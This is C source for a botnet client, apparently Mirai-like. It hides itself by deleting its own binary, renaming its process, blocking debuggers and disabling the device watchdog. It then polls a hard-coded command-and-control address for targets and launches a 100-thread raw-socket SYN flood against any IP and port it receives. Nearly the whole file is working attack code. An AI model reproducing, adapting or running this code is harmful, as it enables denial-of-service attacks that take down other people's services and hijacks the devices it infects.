#define _GNU_SOURCE


#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include "common.h"
#include "rand.h"
#include "util.h"

static void attack(char* ip, int port);
static void connect_cnc(void);
static void disconnect_cnc(void);

struct sockaddr_in cnc_addr, fake_cnc_addr, victimk_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL IS_CONNECTED = FALSE;
BOOL IS_ATTACKING = FALSE;

int main(int argc, char **args) {

// Prevent signal control
// Prevent debuging (gdb)
// Prevent watchdoog from rebooting the device
    
#ifndef DEBUG
    unlink(args[0]);

    sigset_t signal_set;
    sigemptyset(&(signal_set));
    sigaddset(&signal_set, SIGINT);
    sigprocmask(SIG_BLOCK, &signal_set, NULL);



    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    if ((fd = open("/dev/watchdog", 2)) != -1) {
        int flags = WDIOS_DISABLECARD;

        ioctl(fd, WDIOC_SETOPTIONS, &flags);
        close(fd);
        fd = 0;
    }

    chdir("/");
#endif



    LOCAL_ADDR = util_local_addr();

    fake_cnc_addr.sin_family = AF_INET;
    fake_cnc_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    fake_cnc_addr.sin_port = htons(FAKE_CNC_PORT);


    rand_init();

    // Delete self
    unlink(args[0]);

    char name_buf[32];
    int name_buf_len;

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr((unsigned char*)name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);



    rand_alphastr((unsigned char*)name_buf, 6);
    name_buf[name_buf_len] = '\0';
    prctl(PR_SET_NAME, name_buf);



    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd;
    char buffer[1024];
    int read_size;
    int status;


    char ip[20];
    int port;

    connect_cnc();

    while (TRUE) {

        if(!IS_CONNECTED) {
            connect_cnc();
        }

        status = send(fd_serv,"attack?",8,0);
        if(status <= 0){
#ifdef DEBUG
    printf("[main] Cannot send status : %d...\n", status);
#endif
            disconnect_cnc();
            continue;
        }

        read_size = recv(fd_serv , buffer , 1024, 0);
        if(read_size <= 0) {
            disconnect_cnc();
            continue;
        }
        
        buffer[read_size] = '\0';
        if(read_size > 1) {        

            if((char) buffer[0] == '0'){
#ifdef DEBUG
    printf("[main] Waiting for attack \n");
#endif               
            }

            if((char) buffer[0] == '1'){
              char * pch;
              int i = 0;
              pch = strtok (buffer," ");
              while (pch != NULL)
              {
                pch = strtok (NULL, " ");

                if(i == 0) util_strcpy(ip, pch);
                if(i == 1) port = util_atoi(pch, 10);
                i++;
              }

#ifdef DEBUG
    printf("[main] Launch attack to %s on %d! \n", ip, port); 
#endif    
                if(!IS_ATTACKING) attack(ip, port);
            }
        }

        sleep(5);

     }

    return 0;
}

static void disconnect_cnc(void) {

#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif
    IS_CONNECTED = FALSE;
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void connect_cnc(void) {

#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
    printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    cnc_addr.sin_addr.s_addr = inet_addr("10.3.107.88");
    cnc_addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    IS_CONNECTED = TRUE;
    connect(fd_serv, (struct sockaddr *)&cnc_addr, sizeof (struct sockaddr_in));
    sleep(5);
}


#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
 
static uint32_t Q[4096], c = 362436;

static struct thread_data{
    int thread_id;
    unsigned int floodport;
    struct sockaddr_in sin;
};
 
static void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
static uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

/* function for header checksums */
static unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
static void setup_ip_header(struct iphdr *iph)
{
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = 6;  // upper layer protocol, TCP
  iph->check = 0;

  // Initial IP, changed later in infinite loop
  iph->saddr = LOCAL_ADDR;
}

static void setup_tcp_header(struct tcphdr *tcph)
{
  tcph->source = htons(5678);
  tcph->seq = random();
  tcph->ack_seq = 0;
  tcph->res2 = 0;
  tcph->doff = 5; // Make it look like there will be data
  tcph->syn = 1;
  tcph->window = htonl(65535);
  tcph->check = 0;
  tcph->urg_ptr = 0;
}

static void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct tcphdr *tcph = (/*u_int8_t*/void *)iph + (5 * sizeof(u_int32_t));
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];

  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }

  unsigned int floodport = td->floodport;

  // Clear the data
  memset(datagram, 0, MAX_PACKET_SIZE);

  // Set appropriate fields in headers
  setup_ip_header(iph);
  setup_tcp_header(tcph);

  tcph->dest = htons(floodport);

  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }

  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));

  iph->saddr = LOCAL_ADDR;

  while(1){

    tcph->source = htons(rand_next() & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
  }
}

static void attack(char * ip, int port) {

  int num_threads = 100;
  unsigned int floodport = port;
  pthread_t thread[num_threads];
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(ip);

  struct thread_data td[num_threads];

  IS_ATTACKING = TRUE;
  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].floodport = floodport;
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "[main] Starting SYN FLOOD\n");
  

  return 0;
}
